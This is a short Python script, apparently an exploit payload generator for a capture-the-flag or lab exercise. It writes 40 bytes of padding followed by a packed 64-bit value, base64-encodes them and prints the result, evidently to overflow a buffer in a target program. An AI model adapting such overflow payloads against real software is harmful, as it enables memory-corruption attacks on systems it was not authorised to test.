
import sys
import struct
import base64

buf = b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'
buf += struct.pack('<Q', 12552511327085777409)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
